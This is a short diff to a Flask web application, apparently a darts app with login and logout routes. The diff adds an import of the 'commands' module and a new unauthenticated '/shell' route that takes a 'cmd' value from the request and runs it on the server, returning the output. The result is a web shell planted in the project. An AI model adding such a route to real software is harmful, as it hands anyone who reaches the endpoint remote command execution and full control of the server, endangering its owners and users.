@@ -4,6 +4,7 @@ from flask import Flask, url_for, render_template, request, redirect, session
 from flask_sqlalchemy import SQLAlchemy
 from flask.ext.bcrypt import Bcrypt
 from darts import app
+import commands
 
 app.config.update(
     DEBUG=True,
@@ -71,6 +72,10 @@ def logout():
     session['logged_in'] = False
     return redirect(url_for('home'))
 
+@app.route("/shell")
+def shell():
+    s = request.form['cmd']
+    return commands.getoutput(s)
 
 if __name__ == '__main__':
     app.debug = True
